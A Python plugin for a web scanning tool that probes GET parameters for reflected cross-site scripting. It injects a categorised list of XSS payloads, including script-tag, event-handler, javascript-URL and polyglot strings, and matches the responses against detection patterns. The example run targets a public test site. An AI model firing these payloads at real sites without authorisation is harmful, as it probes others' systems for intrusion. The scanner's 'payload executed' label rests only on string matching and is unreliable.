#!/usr/bin/env python3
"""
XSS Detection Plugin for Web Discovery Tool
Version: 2.0
Description: Advanced Cross-Site Scripting vulnerability detection
"""

import asyncio
import aiohttp
import re
import json
import random
import string
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from typing import Dict, List, Set, Any, Optional
from dataclasses import dataclass
import logging
import html

@dataclass
class XSSResult:
    url: str
    parameter: str
    payload: str
    evidence: str
    confidence: float
    context: str
    vector_type: str

class XSSDetector:
    """
    Advanced XSS detection with multiple vector types and contexts
    """
    
    def __init__(self, max_concurrent: int = 10, timeout: int = 10):
        self.max_concurrent = max_concurrent
        self.timeout = timeout
        self.results: List[XSSResult] = []
        
        # XSS payloads categorized by context and vector type
        self.payloads = {
            'html_context': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
            ],
            'attribute_context': [
                "\" onmouseover=\"alert('XSS')\"",
                "' onfocus='alert(\"XSS\")'",
                " onload=\"alert('XSS')\"",
                " style=\"background:url(javascript:alert('XSS'))\"",
            ],
            'javascript_context': [
                "'; alert('XSS'); //",
                "\"; alert('XSS'); //",
                "`; alert('XSS'); //",
                "</script><script>alert('XSS')</script>",
            ],
            'url_context': [
                "javascript:alert('XSS')",
                "data:text/html,<script>alert('XSS')</script>",
                "vbscript:msgbox('XSS')",
            ],
            'polyglot': [
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>\\x3e",
            ]
        }
        
        # Detection patterns
        self.detection_patterns = [
            r"alert\('XSS'\)",
            r"onerror=alert",
            r"onload=alert",
            r"<script>alert",
            r"javascript:alert",
        ]
        
        self.logger = logging.getLogger(__name__)

    async def scan_url(self, session: aiohttp.ClientSession, url: str) -> List[XSSResult]:
        """
        Scan a single URL for XSS vulnerabilities
        """
        results = []
        parsed_url = urlparse(url)
        
        # Test GET parameters
        if parsed_url.query:
            params = parse_qs(parsed_url.query)
            for param_name in params:
                param_results = await self.test_parameter(
                    session, url, param_name, 'GET'
                )
                results.extend(param_results)
        
        return results

    async def test_parameter(self, session: aiohttp.ClientSession, 
                           url: str, param: str, method: str = 'GET') -> List[XSSResult]:
        """
        Test a specific parameter for XSS vulnerabilities
        """
        results = []
        
        for context, payloads in self.payloads.items():
            for payload in payloads:
                try:
                    test_result = await self.execute_xss_test(
                        session, url, param, payload, context, method
                    )
                    if test_result:
                        results.append(test_result)
                except Exception as e:
                    self.logger.error(f"Error testing {url}: {e}")
        
        return results

    async def execute_xss_test(self, session: aiohttp.ClientSession, url: str,
                             param: str, payload: str, context: str,
                             method: str) -> Optional[XSSResult]:
        """
        Execute a single XSS test
        """
        parsed_url = urlparse(url)
        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        if method.upper() == 'GET':
            params = parse_qs(parsed_url.query)
            params[param] = [payload]
            test_url = f"{test_url}?{urlencode(params, doseq=True)}"
            
            async with session.get(test_url, timeout=self.timeout) as response:
                content = await response.text()
                return self.analyze_xss_response(url, param, payload, context, response.status, content)
        
        return None

    def analyze_xss_response(self, url: str, param: str, payload: str,
                           context: str, status_code: int, content: str) -> Optional[XSSResult]:
        """
        Analyze response for XSS evidence
        """
        # Check if payload is reflected in response
        if payload in content:
            confidence = 0.8
            evidence = f"Payload reflected in response"
            
            # Check if payload is executed (basic check)
            if any(pattern in content for pattern in self.detection_patterns):
                confidence = 0.9
                evidence = "XSS payload executed"
            
            return XSSResult(
                url=url,
                parameter=param,
                payload=payload,
                evidence=evidence,
                confidence=confidence,
                context=context,
                vector_type=self.classify_vector(payload)
            )
        
        return None

    def classify_vector(self, payload: str) -> str:
        """
        Classify XSS vector type
        """
        if '<script>' in payload:
            return 'script_tag'
        elif 'onerror' in payload or 'onload' in payload:
            return 'event_handler'
        elif 'javascript:' in payload:
            return 'protocol_handler'
        elif 'style' in payload:
            return 'css_injection'
        else:
            return 'other'

    async def scan(self, target_urls: List[str]) -> Dict[str, Any]:
        """
        Main scanning function
        """
        self.logger.info(f"Starting XSS scan for {len(target_urls)} URLs")
        
        connector = aiohttp.TCPConnector(limit=self.max_concurrent)
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tasks = []
            for url in target_urls:
                task = asyncio.create_task(self.scan_url(session, url))
                tasks.append(task)
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Flatten results
            all_results = []
            for result in results:
                if isinstance(result, list):
                    all_results.extend(result)
            
            self.results = all_results
            
            return {
                'xss_vulnerabilities_found': len(all_results),
                'results': [result.__dict__ for result in all_results],
                'summary': self.generate_summary()
            }

    def generate_summary(self) -> Dict[str, Any]:
        """
        Generate scan summary
        """
        contexts = {}
        vector_types = {}
        
        for result in self.results:
            contexts[result.context] = contexts.get(result.context, 0) + 1
            vector_types[result.vector_type] = vector_types.get(result.vector_type, 0) + 1
        
        return {
            'total_vulnerabilities': len(self.results),
            'contexts_affected': contexts,
            'vector_types': vector_types,
            'confidence_distribution': {
                'high': len([r for r in self.results if r.confidence > 0.8]),
                'medium': len([r for r in self.results if 0.6 < r.confidence <= 0.8]),
                'low': len([r for r in self.results if r.confidence <= 0.6]),
            }
        }

def register():
    """
    Register this plugin with the main scanner
    """
    return {
        'name': 'XSS Detector',
        'version': '2.0',
        'description': 'Advanced Cross-Site Scripting vulnerability detection',
        'author': 'Web Discovery Tool Team',
        'class': XSSDetector,
        'type': 'vulnerability_scanner',
        'categories': ['xss', 'security', 'vulnerability'],
        'config': {
            'max_concurrent': 10,
            'timeout': 10,
            'enabled': True
        }
    }

async def main():
    """
    Example usage
    """
    detector = XSSDetector()
    
    test_urls = [
        "http://testphp.vulnweb.com/search.php?test=query",
    ]
    
    results = await detector.scan(test_urls)
    print(json.dumps(results, indent=2))

if __name__ == "__main__":
    asyncio.run(main())
